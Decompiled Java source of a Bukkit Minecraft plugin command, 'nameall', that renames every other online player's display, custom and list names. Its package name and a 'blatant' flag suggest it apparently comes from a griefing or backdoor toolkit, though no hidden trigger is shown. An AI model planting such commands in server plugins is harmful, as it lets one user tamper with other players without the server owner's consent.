/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.ChatColor
 *  org.bukkit.entity.Player
 */
package me.qlutch.sucks.command.impl;

import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

public class NameallCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (args.length <= 1) {
            p2.sendMessage(Settings.USAGE("nameall <name>"));
        } else {
            StringBuilder name = new StringBuilder();
            for (int i2 = 1; i2 != args.length; ++i2) {
                name.append(args[i2]).append(" ");
            }
            name = new StringBuilder(ChatColor.translateAlternateColorCodes((char)'&', (String)name.toString()));
            for (Player a2 : Bukkit.getOnlinePlayers()) {
                if (a2.getName().equals(p2.getName())) continue;
                a2.setDisplayName(name.toString());
                a2.setCustomName(name.toString());
                a2.setPlayerListName(name.toString());
                a2.setCustomNameVisible(true);
            }
            p2.sendMessage(Settings.PREFIX("Everyone's nickname is now " + Settings.RED + name));
        }
    }

    @Override
    public boolean isBlatant() {
        return true;
    }
}

